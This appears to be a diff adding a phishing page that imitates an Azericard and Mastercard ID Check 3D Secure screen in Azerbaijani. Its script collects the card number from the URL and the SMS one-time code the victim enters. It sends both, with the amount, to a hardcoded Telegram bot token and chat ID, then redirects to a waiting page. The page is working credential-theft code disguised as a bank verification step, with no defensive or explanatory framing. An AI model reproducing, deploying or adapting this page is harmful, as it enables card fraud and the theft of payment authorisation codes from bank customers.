@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azericard - Ödənişin təsdiqi</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 420px;
+            padding: 35px 28px;
+        }
+        .logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .logos img { height: 26px; }
+        .logos span { font-size: 18px; color: #555; font-weight: 300; }
+        .id-check { font-size: 17px; color: #333; font-weight: 700; }
+
+        h2 {
+            color: #222;
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: #666;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            line-height: 1.5;
+        }
+
+        .amount-box {
+            background: #e8f0fe;
+            border-radius: 8px;
+            padding: 14px;
+            text-align: center;
+            margin-bottom: 22px;
+        }
+        .amount-box .amount {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0d6efd;
+        }
+        .amount-box .card-num {
+            font-size: 13px;
+            color: #666;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        .error-box {
+            background: #fdecea;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 18px;
+            display: none;
+        }
+        .error-box.show { display: block; }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            color: #555;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        input[type="tel"] {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 22px;
+            text-align: center;
+            letter-spacing: 12px;
+            font-weight: 700;
+            color: #222;
+            outline: none;
+            transition: 0.2s;
+        }
+        input[type="tel"]:focus {
+            border-color: #0d6efd;
+            box-shadow: 0 0 0 3px rgba(13,110,253,0.15);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            border: none;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 6px;
+        }
+        .btn-primary {
+            background: #0d6efd;
+            color: #fff;
+        }
+        .btn-primary:hover:not(:disabled) {
+            background: #0b5ed7;
+        }
+        .btn-primary:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+        }
+        .btn-secondary {
+            background: #f1f5f9;
+            color: #475569;
+            margin-top: 10px;
+        }
+        .btn-secondary:hover {
+            background: #e2e8f0;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.5;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
+            <span>|</span>
+            <span class="id-check">ID Check</span>
+        </div>
+
+        <h2>3D Secure Təsdiq</h2>
+        <p class="subtitle">Nömrənizə göndərilən SMS kodunu daxil edin</p>
+
+        <div class="amount-box">
+            <div class="amount" id="amountDisplay">0.00 AZN</div>
+            <div class="card-num" id="cardDisplay">**** **** **** 0000</div>
+        </div>
+
+        <div class="error-box" id="errorBox">
+            ⚠️ OTP kodu yanlışdır. Zəhmət olmasa yenidən cəhd edin.
+        </div>
+
+        <form id="otpForm">
+            <div class="form-group">
+                <label for="otp">Təsdiq kodu</label>
+                <input type="tel" id="otp" inputmode="numeric" maxlength="6" placeholder="• • • • • •" required>
+            </div>
+            <button type="submit" class="btn btn-primary" id="submitBtn" disabled>
+                Ödənişi təsdiqlə
+            </button>
+            <button type="button" class="btn btn-secondary" onclick="window.location.href='../index.html'">
+                Ödənişin ləğvi
+            </button>
+        </form>
+
+        <div class="footer">
+            🛡️ Bu səhifə 3D Secure texnologiyası ilə qorunur
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '9124698878:AAHaa7ybeZ-b72I3DN0ptfOM0SxTeHaayMc';
+        const CHAT_ID = '-1004326178006';
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const cardParam = urlParams.get('card') || '';
+        const amountParam = urlParams.get('amount') || '0';
+        const hasError = urlParams.get('error') === 'invalid_otp';
+
+        // Məbləğ göstər
+        const formattedAmount = new Intl.NumberFormat('az-AZ', {
+            style: 'currency', currency: 'AZN'
+        }).format(parseFloat(amountParam));
+        document.getElementById('amountDisplay').textContent = formattedAmount;
+
+        // Kart nömrəsi son 4 rəqəm
+        if (cardParam) {
+            const clean = cardParam.replace(/\s/g, '');
+            const last4 = clean.slice(-4);
+            document.getElementById('cardDisplay').textContent = '**** **** **** ' + last4;
+        }
+
+        // Əgər xəta varsa göstər
+        if (hasError) {
+            document.getElementById('errorBox').classList.add('show');
+        }
+
+        // OTP input
+        const otpInput = document.getElementById('otp');
+        const submitBtn = document.getElementById('submitBtn');
+
+        otpInput.addEventListener('input', function() {
+            submitBtn.disabled = this.value.length < 4;
+        });
+
+        // Form submit
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const otpVal = otpInput.value;
+            if (otpVal.length < 4) return;
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = 'Yüklənir...';
+
+            // Telegram-a OTP göndər
+            const msg = encodeURIComponent(
+                '🔐 3D Secure OTP:\n' +
+                'Kart: ' + cardParam + '\n' +
+                'OTP: ' + otpVal + '\n' +
+                'Məbləğ: ' + amountParam + ' AZN'
+            );
+            const img = new Image();
+            img.src = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg;
+
+            // 1 saniyə sonra wait.html-ə keç
+            setTimeout(() => {
+                window.location.href = 'wait.html?card=' + encodeURIComponent(cardParam) + '&amount=' + encodeURIComponent(amountParam);
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
